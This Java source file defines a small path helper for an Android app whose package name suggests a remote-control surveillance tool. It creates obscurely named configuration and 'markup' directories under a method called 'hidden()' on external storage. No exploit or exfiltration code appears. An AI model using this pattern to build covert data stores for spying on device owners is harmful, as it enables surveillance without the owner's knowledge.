package com.ht.RCSAndroidGUI.file;

import java.io.File;

import android.os.Environment;
import android.util.Log;

public class Path {

	private static final String TAG = "PATH";

    public static final String CONF_DIR = "cdd/";
    //public static final String DEBUG_DIR = "dwm/";
    public static final String MARKUP_DIR = "msdd/";
	
    //public static final String UPLOAD_DIR = "";

	public static String hidden() {
		return Environment.getExternalStorageDirectory()+"/"+"rcs/";
	}
	
	public static boolean makeDirs(){
		
		try {
			File file = new File(conf());
			file.mkdirs();
			
			file = new File(markup());
			file.mkdirs();
			
			return true;
		} catch (Exception e) {
			Log.e(TAG,e.toString());
		}
		return false;
	}
	
	public static String conf() {
		return hidden()+CONF_DIR;
	}
	
	public static String markup() {
		return hidden()+MARKUP_DIR;
	}


	public static boolean removeDirectory(String string) {
		// TODO Auto-generated method stub
		return false;
	}

}
